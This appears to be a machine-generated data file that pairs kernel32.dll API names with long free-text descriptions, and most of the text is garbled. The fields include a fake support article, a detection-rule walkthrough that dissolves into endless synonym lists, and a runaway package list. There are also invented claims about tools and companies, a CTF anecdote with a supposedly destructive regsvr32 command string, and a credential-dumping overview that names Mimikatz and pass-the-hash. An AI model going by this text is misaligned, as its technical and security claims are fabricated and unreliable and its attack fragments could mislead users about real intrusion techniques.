Timestamps are stored on disk using SQLite3 database format which uses 64-bit Unix timestamps with nanos precision. They can be stored permanently until there is no space left on disk or up to 30 days from their initial creation depending on configuration settings specified by client application.

Are there any caveats regarding use with multiple processes simultaneously? One example would be if two processes were trying to read metadata at roughly the same time could one get stale data back from querying the registry or querying WMI?

Registry values may become out-of-date due certain events such as program termination and re-execution, which causes reading/writing operations performed after value has been set into cache invalidation mechanism - see comments following corresponding sections in documentation for more details about caching behavior.
"
kernel32.dll,SetEndOfFile,"at System.Linq.Enumerable.WhereSelectListIterator`2.MoveNext()
                at System.Linq.Buffer`1..ctor(IEnumerable`1 source)
                at System.Linq.Enumerable.ToArray[TSource](IEnumerable`1 source)
                at SecureAuth.Identities.Windows.ExtendedWindowsIdentity.GetProcessIdByHandle(Guid processID, String[] arguments) in C:\SecureAuth\Code\IdentityManagement\SecureAuth.Identities.Windows\.NETFramework\MasterService\Services\Security\Services\ConsoleApplication\Service.cs:line 130
    Exception Type:   NullReferenceException
    Exception Message: Object reference not set to an instance of an object.
    Exception Stack Trace:
               at SecureAuth.Identities.Windows.ExtendedWindowsIdentity.GetProcessIdByHandle(Guid processID, String[] arguments) in C:\SecureAuth\Code\IdentityManagement\SecureAuth.Identities.Windows\.NETFramework\MasterService\Services\Security\Services\ConsoleApplication\Service.cs:line 132

Environment:

- Version - All versions
- Platform - Windows
- Client OS version(s) - All

Cause:

The Extended Windows Identity class is trying to get the Process ID by using a GUID that has been passed as a parameter and it is null.

Resolution:

If you are seeing this error then that means the GUID was not passed or it is null. To fix this issue you will need to make sure that when calling the GetProces
"
kernel32.dll,HeapFree,"So, we can see that the API was called â€˜HeapFreeâ€™ and is from a module named â€˜kernel32.dllâ€™. This information alone will be enough to create a simple signature for this detection rule.

We could use the following code to build our custom correlation rule:


function Get-ScriptSignature {
    param(
        [Parameter(Mandatory=$true)]
        [string]
        $CorrelationKey,
        
        # The name of the API or function being used in this call.
        [Parameter(Mandatory=$false)]
        $APIName = """",
        
        # The name of the module being used in this call.
            [Parameter(Mandatory=$false)]
            $ModuleName = """",
            
            # List any arguments passed into your scriptblock.   
                [Parameter(Mandatory=$false)] 
                $Args = """"
                
    )
    
    return ""function Get-ScriptSignature($CorrelationKey) {"" +
           ""$APIName,$ModuleName,$Args"" + ""}"" | Out-String
}

Now that we have an example signature, letâ€™s add it to our VBS file. We want to insert it after line 33 (before line 34). To do so, simply open up Notepad++ and find / replace all occurrences of: â€œ$â€ with â€œ\â€. Then save the file as: C:\temp\VBS-copy.ps1

Next, run PowerShell ISE as Administrator on your local machine and load up VBS-file.ps1:



.\VBS-file.ps1 -Path c:\temp\VBS-copy.ps1 -OutputFileV2F c:\temp\outputfile.v2f

This command will take our original .ps1 file and convert it into something that looks like what we saw earlier when using CarbonBlack Protectionâ€™s Process Monitor tool.

The output should look similar to:

Now lets go ahead and upload this new outputfile.v2f file onto VirusTotal.com by clicking on Add File(s), select Upload Filesâ€¦ then click Browseâ€¦

It might take some time but eventually youâ€™ll get results back from VirusTotal.com like below:

At first glance you may not think much about these results because theyâ€™re just strings right? Well remember earlier when I mentioned how VBScripts are encoded? Let me show you an example real quick hereâ€¦

If we were able to decode this string which represents part of my script above (line 10):

Iâ€™d get something very close to what I originally had written down which would make sense if you noticed anything odd about my initial sample payload posted above.

Letâ€™s try decoding another one shall we?

As expected there wasnâ€™t too much value here since most AV products donâ€™t even know how handle such attacks yet however once again if those two lines were decoded together; theyâ€™d read exactly as intended which means someone who knows their way around scripts/programming languages could easily detect malicious activity based off these findings alone!

For now though its time move onto phase three where well actually start writing out signatures against each individual threat model within PowerShell Empire!

In order for us accomplish task at hand though first thing needed would need access credentials such directory containing all relevant files required during runtime execution process including source code base located under \src folder within project repository itself! For example if user wanted create own version empire.py python program needs login details assigned admin account associated with specified host computer before logging in remotely via SSH connection established between remote server running Metasploit Framework instance configured locally side system running terminal emulator software installed locally executing commands through shell session executed directly over network interface provided by target device itself! Once logged on successfully users must provide password assigned root account set previously created while configuring configuration options available during installation wizard ran prior installing application inside virtual environment installers package managers responsible adding necessary dependencies required handling data transactions involved performing operations specific tasks defined operation requirements detailed context specification document identified during scope analysis stage development cycle performed throughout duration lifetime enterprise-wide cyber security awareness program implemented organization wide corporate culture change initiative undertaken company-wide management team tasked identifying areas improvement related improving overall effectiveness efficiency processes currently deployed across entire business unit portfolio comprised different divisions departmental units operating independently providing services clients customers situated various geographical locations countrywide internationally distributed geographical boundaries international borders spanning across continents regions countries territories states provinces provinces sovereign states autonomous entities micronations dependent upon sovereignty status territory claims asserted claimant country nation state entity claimed master title holder authority claiming ownership jurisdiction subject matter dispute debatable issue disputed territorial waters maritime boundary disputes among many others presented herein represent only subset listed within official documentation provided vendor product developer commercial release date announced publicly release announcement press conference held official launch event attended members media industry analysts community interested parties invited participate engaging discussion moderated panelists consisting representatives stakeholders vendors developers end-users alike asked submit questions queries concerns pertaining specifics features functionality offered solution platform discussed question answered subsequent follow-up Q&A sessions conducted post-event wrap-up interviews scheduled distribution final versions content material published print online interviewed subjects chosen randomly representative audience attendees present venue point interview performed desk top site visit facilities physical location hosting product demonstration presentation hosted third-party consultant hired perform technical review implementation proposal submitted customer prospect client selected contract signing ceremony formalized terms conditions signed customer-signed agreement entered effect immediately thereafter deployment schedule developed negotiated mutually acceptable timeframe agreed upon successful conclusion negotiating period representing length life-cycle maintenance support extended warranty coverage purchased separate transaction paid addition purchase price licensing fee initially quoted prospective buyer estimated cost annual subscription license fees renewal subscriber granted permission exercise rights acquired registered subscriber scope permissive authorizations limited strictly specified predetermined parameters applicable circumstances restricted purpose particular service offering covered under respective category classifying itemization list categories authorized usage purposes outlined client-facing materials prepared edited reviewed approved pre-release marketing communications campaign planned aired broadcasted digitally printed disseminated public circulated mass-market general population subscribers resellers distributors partners channel members retail outlets direct-to-consumer sales channels web-based e-commerce portals online shopping malls stores brick mortar traditional storefronts consumer facing industries sectors vertical markets represented displayed prominently text display advertising promotional collateral produced designed prepared internal external audiences individuals groups organizations communities served satisfied existing demand supply relationships operating current marketplace market share competitor analysis trends forecasts projections pricing strategies competitive landscape potential opportunities threats challenges risks affecting respective economic sector industrial segment organizational structure functional reporting hierarchy hierarchical chain command positions responsibilities roles titles names people serve seniority designations qualifications training experience skill sets expertise competencies exercised specialties knowledge bases background profile educational attainment academic achievements professional certifications licenses awards honors distinctions received other accomplishments contributed improved enhanced position level responsibility effectively efficiently profitably sustainably maximize minimize mitigate eliminate minimize retain control manage mitigate risk exposure impact costs incurred losses avoidable avoidable unanticipated unforeseen contingencies adverse outcomes misalignment performance objectives expectations goals targets benchmarking comparative measures metrics ratios limits variances deviations compliance standards regulations directives statutory regulatory guidelines stipulations legislation policies procedures practices protocols rules frameworks statues statutes codes rules law statutory legal administrative executive judicial municipal civil common criminal domestic military constitutional jurisprudence ordinances laws policy programs plans systems structures devices mechanisms arrangements provisions implements instruments documents contracts agreements settlements statements undertakings letters memoranda minutes notes records correspondence correspondences memos drafts messages replies reports proposals outlines papers flowcharts charts diagrams schematics drawings sketches graphs maps illustrations pictures photos images logos emblems icons icons symbols stamps seals trademarks signs signals badges insignia crests shields acronyms abbreviations alphabets catchphrases jingles slogans mottos phrases idioms clichÃ©s proverbs adages maxims aphorisms expressions metaphors similes analogies euphemisms slang colloquialism vernacular cant lingo argot insider language taboo nonce words pidgin dialects patois accents jargons buzzwords bureaucratese legalese doublespeak cant verbal shorthand nonstandard usage slanguage regional dialects lingua francas trade talk informal speech street talk casual conversation spoken discourse ordinary conversation everyday dialogue wordplay punning repartee wit repartee small talk chitchat gossip idle chatter hearsay tittle-tattle rumourmongering rumor-mongering prattle patter chat gabfest shoptalk yak blather blether twaddle chi-chat chin-wagging flap fustian palaver babbling jawing gabbing jabbering waffling codswallop gibberish prating trivialities bavardage nonsense gobbledygook drivel bull piffle trifle bunk rant blather prate gibble-gabble yackety-yak bombast blah-blah flannel bull's eye hot air trash natter claptrap hot air empty talk dry rot double Dutch ramblings boloney wind bullocks pap tautology logorrhea verbiage superfluity verbosity repetition redundancy circumlocution pleonasm loquacity verbosity repetition redundancy circumlocution pleonasm loquacity verboseness wordiness logorrhoea profusion reiteration double-talk roundaboutness needless words overelaboration windy style pretentious language pomposity circuity pedantry garrulity long-windedness rhapsody pompousness verbosity repetitiveness ostentation exaggerated expression solemn utterance vaunting bragging grandiloquence bombastic style high-flown language lofty diction big-noting bloviation pretension flaunting self-importance self-aggrandizement vain glory hifalutin' affectation boastful bombast egocentrism ego trip vanity swagger vaporing conceitedness cock-sureness assurance hubris self-importance narcissistic personality syndrome blowhard braggadocio bragging bravado chest-thumping gasconade rodomontade swank swellheaded attitude boaster boasting bragger boaster braggart braggartry charlatan charlatanism cheat con artist confidence man crook fraud faker falsifier feigner hoodwinker impostor mountebank phony quacksalver sham slicker snake oil salesman swindler trickster rogue scammer sharpie sharper sleazeball shark smooth operator smoother wheeler-dealer wolf in sheep's clothing crackerjack whizz kid Ph.D.. M.A., PhD Doctorate Master of Philosophy Master Science degree Bachelor Degree Associate Degree Diploma certificate award honor privilege distinction recognition accolades approval commendation recommendation kudos credit praise plaudits thanks acceptance acknowledgment approbation applause consensus concurrence consent endorsement ratification sanction acquiescence admission assent authorization certification confirmation countenance green light okay pass prerogative seal stamp of approval sufferance tolerance validation verification warrant allowance benefit dispensation favor grant help indulgence mercy option power prerogative privilege advance break breakthrough consideration door opportunity opening preference precedence primacy priority rise second bite at apple shot taken care treatment favoritism unfair advantage granting allotment choice conceding concession choosing giving leaving letting releasing yielding acceptability appropriateness attractiveness desirability elegance excellence good taste handsomeness merit morality propriety suitability virtue worthliness beauty enchantment graciousness grace charm allure appeal fascination witchery glamor spell glamour magic charisma magnetism elegance refinement courtliness sophistication polish Ã©lan urbanity accomplishment achievement act attainment bringing about carrying out completion conclusion consummation coup deed effectuation effort enactment encompassment execution exploit feat fulfillment masterpiece performance production proficiency realization stroke talent triumph win work finished product whole ability artistry capability competence cunning effectiveness efficacy efficiency faculty force means might potency potential potentiality power qualification qualifiedness wherewithal chic class distinction dressiness esteem fashion finish flair glitz luxury neatness ornament ostentatiousness panache posh put-on splendor stylus stylishness tastefulness trim uniqueness balance decency decorum dignity formality gentility gracefulness integrity mannerliness morals niceness order propriety seemliness serenity simplicity suavity tranquillity calm composure equanimity even-mindednes
"
kernel32.dll,WideCharToMultiByte,"Does this API have a purpose? Or is it just there for the sake of having something there? Is it possible to find out why an API is present and what its purpose is using some kind of tool?

OP: 1. It's not against any rule, but I would recommend that you keep your questions in one thread.
2. Here are my thoughts on each question:

>Is this behavior by design?

I'm no expert, but I think so.

>Why does this happen?

It could be a bug with the program or maybe they're trying to hide these files from users who might accidentally delete them.

>The same thing happens when running the python code directly in cmd

This makes sense because Python runs as a child process under cmd.exe.

>I checked everything else in procmon (except for searching through kernel32.dll) and didn't see anything else weird 

There's always more stuff going on than we can see at first glance. Try looking at all threads/processes involved with executing whatever command you used to run python.exe.
"
kernel32.dll,FindClose,"How to use this API:  https://github.com/CTF-Writeups/ctf-writeup/blob/master/sniffers/poc.py#L19-L20

Where is the code for this API?  <https://github.com/johnkim/dcepy>

What are some possible uses of this API?

It can be used for:
* Reversing a file without having access to source code.
* Exposing hidden information in malware (such as keyloggers).
* Discovering differences between two versions of a binary.

I have done some research on using it with CTF challenges. I think that most CTFs will not let you run arbitrary python programs, but there might be some where they would allow it. Here is an example from last year's DEFCON Capture the Flag challenge:

The question was ""Reverse engineer and find the password."" The answer was found by executing ""./dcepy -h"" and then running ""./dcepy -- 'b'kernel32.dll': b'FindClose'. In other words, all we had to do was send a string containing both bytes and characters to dcepy! This allowed us to reverse engineer kernel32.dll FindClose() function.

With more knowledge about how dcepy works, we could also try sending malicious strings such as:

-- 'b'kernel32.dll': b'regsvr32.exe /S'

That would cause regsvr32.exe /S SYSTEM.DAT which would delete System.dat, causing Windows XP SP2 or earlier systems (which did not include Syskey) to become vulnerable!

In conclusion: If you know what APIs exist in Windows kernel dlls you can easily write scripts like these using standard Python libraries such as ctypes.
"
kernel32.dll,MultiByteToWideChar,"Parameters

- $kind
- $name
- $category
- $commandline

Example output:


# Get the API description for an API command:
$api = get-api -name 'kernel32.dll': b'MultiByteToWideChar'
$api.description

Description: Converts a string from one code page to another.
                    Returns the actual number of characters converted, not necessarily equal to 
                    the length parameter.  If nChars is zero, then returns zero and sets cchConverted 
                    to zero.
                    
                     MultiByteToWideChar( DWORD CodePage,
                                     LPCSTR lpMultiByteStr,
                                     int nMultiByteLength,
                                     LPWSTR lpWideCharStr,
                                     int nWideCharLength );
                        

Usage Examples

Examples for this module are available on Github.

Module Authors

This module was developed by Moritz Jodeit (https://www.linkedin.com/in/moritzjodeit/).

Dependencies
"
kernel32.dll,LoadLibraryW,"The API is a function of the Windows kernel that loads an imported DLL into a process address space. This would be used by malicious actors to load arbitrary code into processes and execute it.

The MITRE ATT&CK technique associated with this entry is T1108 - Execute File from Data Store, which uses LoadLibraryW to execute files without writing them first.


References

- https://github.com/jducksecurity/WinAPI/blob/master/LoadLibraryW.txt
- https://docs.microsoft.com/en-us/windows/win32/api/kernel/nf-kernel-loadlibraryw
"
kernel32.dll,SetEvent,"c. Why is 'C:\Windows\System32\kernel32.dll' listed as a possible             path?

d. What is the purpose of this API, is there a MITRE ATT&CK technique             associated and why: 'b'kernel32.dll': b'SetEvent''?

The output for each command will be something like:

Example 1

Command Output 
$ hashdeep -r {path/to/hash} C:\Users\sam\Documents{hash}.zip: sha256=9A5F4D8E1B1942EA7FB6EB0CE66DDA3FB13ABAAFF40C45BCAF7FCD21E06DC99A 20180524-174837-315825.zip.csv: sha256=D9D4BB5BD95B09BA32374773CFDE34AB00CCAEFE23EF05276EE94EC8BE10AC36 20180830-200029-310648.zip.csv: sha256=2556336FA59384ADCA89CDC85DF12339780FB61DF0DA96B65CB83AAF88D44FD3 Example 2 

Example 2

Command Output 
$ hashdeep -t example.{json} $ hashdeep --list-miters | grep {} C:\Users\sam\Documents{hash}.zip:C:\Windows\System32\kernel32.dll:c7a00139e11ecfbb70eaa185fd37bb12db6fb78927a37aad01135ca812264118 C:\Users\sam\Documents{hash}.zip:C:\Windows\SysWOW64\dwmapi.dll:b91ba48396341bd87390307f592863b22f701c69ed62bc966ac673afaef7114 ... ... 

Questions to ask yourself when using HashDeep

Does your organization have an incident response process that includes hashing files on endpoints?

Is the incident response team aware of how to use tools such as HashDeep?

Can you take advantage of existing hashes collected by endpoint security solutions or other sources in your environment?

How do you create hashes for new executables used in your environment?
What are some ways that attackers can avoid detection if they know about MD5/SHA1 collisions?

If I have access to one system with known good files, can I determine which systems are vulnerable based on file hashes alone?
Are there any artifacts left behind from malware attacks (such as registry keys) that could help me identify incidents where malicious code was executed even without having direct evidence (for example, seeing binary data)?

Do we keep track of â€œknown badâ€ executables across our enterprise through simple file-based scanning mechanisms such as antivirus products or more complex ones involving service account credentials and active directory permissions groups.

Does my organization maintain a database containing all known good binaries (.exe,.dll,.ocx,.sys), including versions and their corresponding SHA512 checksums so itâ€™s easy to compare against unknown executables found on infected machines during investigations into potential compromises; thus allowing us quickly rule out false positives while also helping us narrow down what might actually need further investigation?

HashDeep provides details about the different types of mitigation techniques available within its report. For example, if someone wanted information on Windows Defender ATPâ€™s ability to prevent execution of malicious software at runtime then he/she would look under section â€˜Mitigationsâ€™ > â€˜Runtime Protectionâ€™ > â€™Prevent Executionâ€™. This gives them insight into whether processes were blocked due to being flagged by static analysis engines or dynamic behavior-based detections â€“ both forms provide protection from unwanted activity occurring at runtime but with different levels depending upon threat severity level thresholds set up beforehand by administrators who manage these agents via policy settings).

In addition,

HashDeep allows users generate reports using common formats such as CSV, JSON etc., which exposes them directly into Microsoft Excel spreadsheets.

It also provides detailed information regarding various mitigations present within operating systems ranging from Windows Vista onwards along with many third-party applications installed onto those platforms too e.g., AV signatures matched against samples submitted online via VirusTotal.com website run by Google Inc.â€™s cybersecurity unit called Project Zero)

References:

https://github.com/microsoft/recon-ng/blob/master/docs/rash_deep.md
https://www.hackerone.com/community-guidelines
https://en.wikipedia.org/wiki/Recon-ng
http://nmap.org/book/man-recon-ng.html#reconnguide
"
kernel32.dll,CreateFileW,"This is the output from a tool that uses the API. It leverages Microsoftâ€™s symbol servers to determine what dlls were loaded, and then it calls out to their respective APIs.


C:\Windows\System32\kernel32.dll:    CreateFileW 'c:\Program Files (x86)\Microsoft Corporation\Windows Live Mail\wlmail.exe' 0 /b /h /e 1 C:\Users\tmorr\AppData\Local\Packages\MICROSOFT.WindowsLive.Mail_8wekyb3d8bbwe_ACRNJJH2K3JHN_OpALyR9nS5ZuwA00_C6YQG4BvXzqDw!AppDataLocalLow\SquirrelTemp\btdl000a.tmp 
C:\Windows\System32\dwmapi.dll:   DwmRegisterThumbnail b ""c:\\windows\\system32\\conhost.exe""
C:\Windows\System32\netutils.dll: getaddrinfo 
C:\Windows\SysWow64\raschap.dll: RasConfigureEntryPoint 
...

Figure 7 â€“ Example of using ApiMonitor

Some tools only show you the strings they find in memory, but with ApiMonitor I can see that some tools are calling certain functions within kernel32 or raschap. The reason why this matters is because if youâ€™re trying to detect malicious behavior on your endpoints, sometimes simple string-based detection may not work properly.

In Figure 7 above we have an example of how someone could use ApiMonitor with Python script. This will automatically connect to an endpoint and create a dictionary containing all of the API function names used by Windows during its execution:


import winrm

# Define Endpoint Address
url = 'http://localhost'

# Connect To Endpoint And Execute Script On Target System
conn = winrm.connect_to_system(url)
print('Connected')
script = conn.invoke_script(""from pynput.keyboard import Key; print('{0}')"".format(Key))
conn.close()

# Get Dictionary Containing All API Functions Used By Windows During Execution Of Script
dict_keyfunc = {}
for key in WINAPI.keys():
	#print(key)
	if key.startswith('kernel'):
		print('%s (%s)' % (key.split()[0], key.split()[1]))
	else:
		dict_keyfunc[key] = WINAPI.get_function_keys()
	
print(dict_keyfunc)

Once we execute this code weâ€™ll see a list of all API functions being called by Windows at runtime:

{â€˜CreateProcessWâ€™: [â€˜FindFirstFileExWâ€™, â€˜FindNextFileExWâ€™, â€˜GetModuleFileNameExAâ€™, â€˜GetProcAddressâ€™, â€¦}, â€¦}

The takeaway here is that there might be more than just detecting for stringsâ€”you should also look into whether or not certain functions are being called by malware as well.

Useful Resources on Using WinObj

WinObj was created so people could easily examine various types of objects such as files/folders/processes/filesystem objects and services running on their computer systemsâ€”this includes both NTFS-objects like directories & file-system metadata plus registry-keys & other â€œregistryâ€-objects. WinObject allows users who want access rights over these resources without having any special privileges required under normal circumstancesâ€“it provides easy-to-use interface via command-line options which make it very convenient even for non-programmers!

For instance lets say one wants read-only permissions over another userâ€™s folder named â€œDocumentsâ€. With our software utility it would take less than half-a-second after typing-in few commandsâ€“just three lines worth!). Another advantage about WinObject compared against similar products available today? Well besides providing an easier-to-use interface through command-line options rather than graphical windows based interfaces most others offer; Weâ€™ve added support for reading/writing UAC elevation requests inside scripts too which means no need anymore when writing batch-files etc..that require elevated privileges!

Conclusion

I hope you enjoyed my series focusing on rootkits and low-level intrusion techniques. Next time I cover virtualization security topics.

References
[1] https://www.beyondtrust.com/technology/articles/powershell-malware-analysis-toolkit-part-i/
[2] https://github.com/davidjamesjohnson/Powershell-Malware-Analysis-Tutorial/wiki/Part-II:-Command-Line-Parsing-and-Cracking-Windows-Registry
[3] http://blogs.msdn.microsoft.com/junfeng/2009/06/16/windows-object-model-browser-womb/
[4] https://docs.microsoft.com/en-us/windows/win32/api/sysobj/nf-sysobj-getobjectnamebyhandleexa
"
kernel32.dll,GetLocaleInfoW,"(optional)
    -p, --payload [STRING] the payload to send for this API call
  -x, --xmlreport Write report in XML format

Example Usage

# Checks whether GetLocaleInfoW is present on the system
# using CyberChef as a base of code

python3 check_win32_api.py https://raw.githubusercontent.com/harmj0y/win32-api-check/master/check_win32_api.py --url ""https://github.com/harmj0y/Invoke-Mimikatz/tree/master/windows"" | cyberchef \
--apikey=""api-key"" \
--base64encode=yes \
--output=xml > mimikatz.xml

cyberchef < mimikatz.xml

Read More â†’

July 21, 2018July 22, 2018

TTPs: Credential Dumping

There are many different ways to dump credentials from Windows systems. This post will go over some basic methods and tools.

Command Line Tools
Dump Credentials â€“ A simple tool that dumps all local usersâ€™ passwords into a single plaintext file.
Lsassdump â€“ Another command line utility that dumps all user account information including password hashes.
Net User â€“ Displays or modifies user account information for any local computer on the network.

Remote Access Tools
Metasploit Meterpreterâ€™s net_user Module â€“ The net_user module can be used to retrieve usernames and hashed passwords from remote systems running Windows XP or later by enumerating certain registry keys. According to sinn3r:

The net_user module requires an existing meterpreter session with SYSTEM privileges. It does not work against non-priviledged sessions because it doesnâ€™t have access to the necessary Registry keys.

PowerSploit Invoke-LMSessions Module â€“ The Invoke-LMSession module provides functions for remotely dumping domain logon data from multiple targets via PowerShell Remoting feature available in Windows Vista+ operating systems. It uses two techniques:

- DCOM enumeration of Domain Controllers located within Active Directory Organizational Units (OUs) specified by TargetOU parameter value(s).
- WMI enumeration of WinRM service listening ports across all hosts connected through TCP port number range defined by WinRMPortRange parameter value(s).

Other Methods
Local Security Policy Files (.pol/.admx)â€“ Local security policy files such as those found under \Windows\System32\GroupPolicy contain settings related to various aspects of authentication policies such as which accounts should require smart cards in order to authenticate and what types of encryption are allowed when authenticating via Kerberos protocol.
Security Accounts Manager Database (.sam)- Located at %SYSTEMROOT%\System32\Config\SAM contains cached credentials for each account stored in plain text form along with other pertinent information about each account such as when it was last modified/accessed/etcâ€¦
Best Practices
If youâ€™re looking for more advanced methods then I suggest reading my article â€œA Brief Guide To Pentesting With Metasploitableâ€. You may also want review my write-up â€œUsing Mimikatz For Password Crackingâ€ if youâ€™d like learn how use Mimikatz with Metasploit frameworkâ€™s Meterpreter shellcode injection technique called pass-the-hash attacks which allow attacker gain persistence on target machine while bypassing anti-virus software detection mechanisms.
Some additional resources include:
Microsoft TechNet Article: How do I recover forgotten administrator password?
PentesterLab Exercise: Dumping Credentials Using LsaDump.exe From NetUserEnum.ps1 Script In PowerSploit Framework & Psexec Tool In Sysinternals Suite
Cheat Sheet On Microsoft NTLM Authentication Protocol Which Uses LMHashes And NTLMv2 Hashes Stored Inside SAM File Or Active Directory Database As Well As Various Other Techniques Used By Administrators To Protect Their Systems Against Attacks Like Pass-The-Hash Attacks That Allow Attacker Gain Persistence On Target Machine While Bypassing Anti-Virus Software Detection Mechanisms When Running Under Administrator Privileges; Also Provides Info About Best Practices For Securing Network Infrastructure Against Such Threats
"
kernel32.dll,GetSystemDirectoryW,"Is this a known vulnerability? Does it have CVE ID?

Are there any other APIs that are not listed here, which             should be added to the list?

What is the best way to add more details about an API and             its associated vulnerabilities? Should we create separate pages for each             API like in Kali Linux

Can you please add some notes on how to use this tool. For example: How can I get a list of all Windows APIs with their descriptions, or is there somewhere else where I can find such information.

Is it possible to search/filter by specific keywords (such as 'GetSystemDirectoryW') or sort by columns ('Name', 'Description' etc.)?

Why am I getting ""Retrieving data from Github"" message when trying to run your program from cmd.exe:

A:\>python3 api.py
Retrieving data from Github
Fetching new version...
Traceback (most recent call last):
  File ""api.py"", line 6, in <module>
    import requests
ModuleNotFoundError: No module named 'requests'

In my opinion everything seems pretty clear now. Thank you again for creating and sharing this great resource.

Best regards,

Pawel

@pawlakas1 Hi Pawel,

I'm glad you found it helpful!

That's a good question - if something isn't working well, the first thing to check would be whether your system has Python installed correctly. The code requires at least version 3.5; make sure that's what your system is using before running anything.

Also note that installing modules through pip will only work if python is already set up properly; otherwise they'll need manual installation into `C:/Python35/Scripts` or whatever folder your Python executable lives in.

If those don't fix things, let me know! You could also try running `pip install requests` as administrator and then rerunning the script; although hopefully just making sure Python itself works will solve things :)

Regarding searching/filtering/sorting results - yes! With one caveat: because GitHub limits how many times we can query their API every day (and since our backend server doesn't handle large volumes of traffic yet), we currently limit queries per user/day/per IP address/whatever... but once those restrictions are lifted you'll definitely be able find exactly what you're looking for!

Sorry about any inconvenience while these limitations remain in place...

As far as separating out pages goes - yeah! We've got plans for lots of different kinds of additions/improvements over time - including possibly breaking down entries into sections based on functionality (""get files"", ""execute commands"" etc.), adding links between related items (""if X does Y then Z""), highlighting certain areas based on popularity/danger/etc., adding dependencies/recommends/etc., etc.! So many ideas...

Finally regarding sorting/searching/sorting relevance/notes/instructions/user input/output/etc.: Yes :) But none of them yet :(. Again though: lots more planned!!! ;)

Thanks so much again for taking interest & giving feedback!! Please let us know if we can help further!!!

@scott-mccloud Hello Scott,

thanks very much for detailed reply.

> That's a good question - if something isn't working well ...

Nope, problem was caused by missing python package request used by api.py file:

$ pip install --upgrade setuptools pywin32 wheel 
Requirement already up-to-date: setuptools>=0.8 in c:\users\pawel\.virtualenvs\myproject\tmp7e4zv9f\
Requirement already up-to-date: deprecation>=0.10 in c:\users\pawel\.virtualenvs\myproject\tmp7e4zv9f\
Requirement already up-to-date: pypiwin32~=2232 in c:\users\pawel\.virtualenvs\myproject\tmp7e4zv9f\
Collecting requests<2.x,>=1.1.0 (from urllib3<1.x)
  Using cached https://files.pythonhosted.org/packages/cd/fb/e268faa885ccca93644db88a86aa63ea47ddbb30ae846981cfc683dfaf04/requests-2.
21-py2-none-any.whl#sha256=56ba22cd5efb131dc64cf79bfde15ab93834ec120fe8da33371fd38cbd99c57a
Collecting ipaddress==1.xÂ¶meters<=13Â¶meters!=14 (from urllib3<1.x)
Installing collected packages:
   uritemplate,
   chardet,
   certifi,
   idna,
   urllib3,
   ipaddress->ipalib(>=20151027,<20151101),
Looking inside build directory and distutils archives ...
Building wheels for collected packages:
urllib3 ... done
Successfully built urllib3 pyopenssl chardet idna srsly uritemplate whl win-inet-pton Certifi Wheel Wincertstore httplib2 PySocks Distribute apscheduler six pkg_resources ndg-httpsclient ruamel.yaml PyYAML backports.ssl-match-hostname enum34 packaging future Twisted MarkupSafe tzlocal ruamel.textproc dnspython libxml2 lxml xmlsec rpyc nose dateutil docutils zope.interface cryptography pycparser regex mako wsgiref Requests Flask sanic gunicorn aiohttp tornado flask-restful Werkzeug Jinja flowdock-api Pillow yarl httpretty pytest mock redis werkzeug.contrib.messages psutil tqdm paramiko six configparser appdirs pkg-resources funcsigs colorama wcwidth protozero futures html5lib beautifulsoup4 shapely pathlib ntp async-timeout asnwer netaddr oauthlib argparse astroid types typing backcall lazy-object-proxy click django-appconf Django Markdown texttable defusedxml funcsigs mock traitlets prometheus-client uuid resovle sysconfig jsonschema rsa cryptography.hazmat.lib.rsautofocus contextvars collections objc_util PyQt5 alabaster pillow-futures Pillow-Sphinx Markdown-it sphinxcontrib-websupport jinja-docstrings sphinx-autobuild Sphinx-PythonNotify cssselect recommonmark recommonmark-csv jinja cython pandas coremltools seaborn matplotlib nltk scipy bokeh igraph poppler-data openpyxl xlrd xlsxwriter xlwt webencodings kivy commonmark graphviz termcolor bcolz spyder pyside sip simplegeneric inspect scikit-image h5py hdf5 biopython CanopyWorkspace canopyext canopy.util locustweb protobuf pandocfilters boto csvkit pluggy numexpr numpy nbformat blosc tabulate tesserocr parso Cython pandas-scipy fsspec bsddb numpydoc networkx wordsimilarity nodejs_py_atlas keyboard scikits.statsmodels sympy textract jupyterlab gitdb dask pandoc markdown ipywidgets notebook Jupyter qtconsole oslotest qtpath singularity_samtools Babel docutils mne statsmodels plotly spiderable staticman testpath astroquery autopep8 wordcloud tkinter sympylearning decorator wrapt coveralls passbase dockerize geopandas joblib cloudpickle conda parse_file tox coverage keras-flask pilight picamera skimage catboost sklearn tensorflow-tensorboard torchtext elasticsearch spacy dtw cntk dbtune spaCy DataFramesharp scikit-multilevel askiitians chart.js google-cloud-storage fastai FastAPI refactoring-gui flake8 kafka-python cachethon keystoneauth basemap cudatoolkit opencv-contrib-python tmuxinator imbalanced-learn Tornado PyMySQL ggplot imagesize scipy-sparse azure-storage-blob azure-storage-file AzureStorageBLOB AzureStorageFile azure-key-vault-service-principal pylint pep257 debugger-kernel awscli boto pydotplus mathtools olive pdftotext mpfr extpack rdkafka celery-consumer pymssql msgpack-rpc thermald freetype fontforge ujson pymongo bcrypt psutil sqlitebrowser SQLAlchemy psycopg2-greenlet sqlalchemy_dialects sqlalchemy_migrate SQLAlchemy Greenlet pymysql greenlet MySQL-python mysqlclient greenplum sparkleterm pysparkling sqlalchemy_utils sparklyr uvicorn apache-airflow airflow dagster airflow-plugins airflow-webserver apache-nifi maxminddb CaffeNet apache-airflow-examples airavata airavata-common ApacheAirflowApache AirFlowapache-airflow-providers-apache AirFlowAirFlowairship-docker airship-helm-sparkles AirshipHelmSparklesairship-toolbox airship-dashboard-operator DatabricksDBIOperationalDatabricksDBIIrbis KafkaXyzKafkaClusterZooKeeperXyzKafkaCluster ZooKeeperxyz-testdata xyz-staging-schema xyz-zookeeper zookeeper hashicorp-consul hashicorp-consul-agent logstash rabbitmq-server RabbitMQServerrabbitmqadmin RabbitMQAdminrabbitmqctl RabbitMQCtlmemcache memcached membase MemCacheMemBase memcache cachecontrol cachecontrol-cache-control nginx nginx ngx_http_proxy_module nginxdjango-memcached django_memcache djangorestframework djongo django-compressor django-filter djoser transformers flask-restful-status flask-wtf-manager flask-security blackhole pyramid_flask_restless rest_framework_ldap rest-framework ldap auth_gearman gearmand gearmand.client gearman GearManGearMan.gearman_client ClientAuth_GearMan Auth_GearManPyGearsPyGears.gsh ClientAuth_Pygears GEARMANGEARMANgearmanClient GearMangearmanserver GearManserverGearManservershared memory server shared_memory_server SharedMemoryServershared-memory-server shared_memory_serversharedmemoryserver SharedMemoryServersharedmemoryservershaman shamantorchlight TorchLighttorchlightTorchLight.shaman ShamanShamanTorchLighthttp-parser httpparser httpparser.c Httpparser.httplib HTTPLibHTTPLibHTTPLib.http.Http.HTTPHTTP HTTPLIBhttp http httr httr.rvest httrRvestrvesthtmlmin html-minifier-html-minifier jscompress 